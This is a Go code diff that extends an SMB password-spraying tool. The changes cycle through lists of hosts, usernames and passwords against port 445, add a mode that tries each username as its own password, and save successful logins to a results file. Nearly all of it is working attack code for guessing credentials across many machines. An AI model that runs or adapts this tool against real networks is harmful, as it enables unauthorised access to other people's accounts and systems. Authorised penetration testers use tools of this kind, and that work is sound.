@@ -1,9 +1,9 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"os"
-	"strings"
 	"sync"
 	"time"
 
@@ -11,10 +11,14 @@ import (
 )
 
 type Runner struct {
-	counter   int
-	running   bool
-	conf      *Config
-	startTime time.Time
+	counter     int
+	running     bool
+	conf        *Config
+	startTime   time.Time
+	currentUser string
+	currentPass string
+	currentHost string
+	workingPass []byte
 }
 
 func NewRunner(conf *Config) Runner {
@@ -22,6 +26,10 @@ func NewRunner(conf *Config) Runner {
 	r.conf = conf
 	r.running = false
 	r.counter = 0
+	r.currentUser = ""
+	r.currentPass = ""
+	r.currentHost = ""
+	r.workingPass = nil
 	return r
 }
 
@@ -37,37 +45,85 @@ func (r *Runner) Start() {
 	fmt.Println(SEP)
 
 	var wg sync.WaitGroup
+	var workingPass []byte
 	wg.Add(1)
 	go r.runProgress(&wg)
 
+	result, ferr := os.Create("results.csv")
+	rerror, eerr := os.Create("error.txt")
+
+	if (ferr != nil) || (eerr != nil) {
+		return
+	}
+	defer result.Close()
+	defer rerror.Close()
+
 	limiter := make(chan bool, r.conf.threads)
 	for r.conf.passwds.Next() {
-		nextPassword := r.conf.passwds.Value()
-		for r.conf.users.Next() {
-			limiter <- true
-			nextUser := r.conf.users.Value()
-			wg.Add(1)
-			r.counter++
-			go func() {
-				// release a slot in queue when exiting
-				defer func() { <-limiter }()
-				defer wg.Done()
-				r.RunTask(nextUser, nextPassword)
-				if r.conf.sleep > 0 {
-					time.Sleep(time.Duration(r.conf.sleep*1000) * time.Millisecond)
-				}
-			}()
+		wg.Add(1)
+		nextPassword, passPos := r.conf.passwds.Value()
+
+		if passPos < 0 {
+			return
 		}
-		// Reset the pwd inputlist position
+		for r.conf.users.Next() {
+			wg.Add(1)
+			nextUser, userPos := r.conf.users.Value()
+
+			if userPos < 0 {
+				return
+			}
+			for r.conf.host.Next() {
+				limiter <- true
+				wg.Add(1)
+				theHost, thePos := r.conf.host.Value()
+				if string(nextPassword) == "!!user!!" {
+					workingPass = nextUser
+				} else {
+					workingPass = nextPassword
+				}
+
+				r.counter++
+				go func() {
+					// release a slot in queue when exiting
+					defer func() { <-limiter }()
+
+					r.currentHost = string(theHost)
+					r.currentUser = string(nextUser)
+					r.currentPass = string(workingPass)
+					w := bufio.NewWriterSize(result, 512)
+					ee := bufio.NewWriterSize(rerror, 512)
+					taskRes := r.RunTask(nextUser, workingPass, theHost, &wg, w, ee)
+					w.Flush()
+					ee.Flush()
+					if taskRes != nil {
+						r.conf.host.Remove(thePos)
+						fmt.Printf("\n [%d] Success: %s // Username: %s // Password: %s\n", thePos, theHost, nextUser, workingPass)
+					}
+
+				}()
+
+			}
+
+			// Reset the pwd inputlist position
+
+			wg.Done()
+			r.conf.host.position = -1
+
+		}
+
 		r.conf.users.position = -1
+		wg.Done()
+
 	}
+
 	wg.Wait()
 }
 
 func (r *Runner) runProgress(wg *sync.WaitGroup) {
 	defer wg.Done()
 	r.startTime = time.Now()
-	totalProgress := r.conf.users.Total() * r.conf.passwds.Total()
+	totalProgress := r.conf.users.Total() * r.conf.passwds.Total() * r.conf.host.Total()
 	for r.counter <= totalProgress {
 		r.updateProgress()
 		if r.counter == totalProgress {
@@ -92,31 +148,41 @@ func (r *Runner) updateProgress() {
 	mins := dur / time.Minute
 	dur -= mins * time.Minute
 	secs := dur / time.Second
-	totalProgress := r.conf.users.Total() * r.conf.passwds.Total()
-	progString := fmt.Sprintf(":: Progress: [%d/%d] :: %d tries/sec :: Duration: [%d:%02d:%02d] ::", r.counter, totalProgress, int(reqRate), hours, mins, secs)
+
+	progString := fmt.Sprintf(":: Progress: [:: %6d tries/sec :: Duration: [%02d:%02d:%02d] :: [%15s:%15s]", int(reqRate), hours, mins, secs, r.currentUser, r.currentPass)
 	fmt.Fprintf(os.Stderr, "%s%s", TERMINAL_CLEAR_LINE, progString)
 }
 
-func (r *Runner) RunTask(username []byte, password []byte) {
+func (r *Runner) RunTask(username []byte, password []byte, host []byte, work *sync.WaitGroup, txt *bufio.Writer, wtf *bufio.Writer) []byte {
 	options := smb.Options{
-		Host:     r.conf.host,
-		Port:     r.conf.port,
+		Host:     string(host),
+		Port:     445,
 		User:     string(username),
 		Password: string(password),
 		Domain:   r.conf.domain,
 	}
+
 	session, err := smb.NewSession(options, r.conf.debug)
+	defer work.Done()
+	//	result := fmt.Sprint("%s %s %s", username, password, host)
+	//	os.WriteFile("dummyhash", []byte(result), fs.ModeAppend)
 	if err != nil {
-		errstr := fmt.Sprintf("%s", err)
-		if !strings.Contains(errstr, "Logon failed") {
-			fmt.Printf("%s [!] Error: %s\n", TERMINAL_CLEAR_LINE, err)
-		}
-		return
+
+		fmt.Fprintln(wtf, host, err)
+		return nil
 	}
-	defer session.Close()
 
 	if session.IsAuthenticated {
-		fmt.Printf("%s [*] In hacker voice *I'm in* // Username: %s // Password: %s\n", TERMINAL_CLEAR_LINE, username, password)
+
+		fmt.Fprintln(txt, string(host), string(username), string(password), "\r")
+		session.Close()
+
+		return host
+	} else {
+
+		session.Close()
+
+		return nil
 	}
 }
 
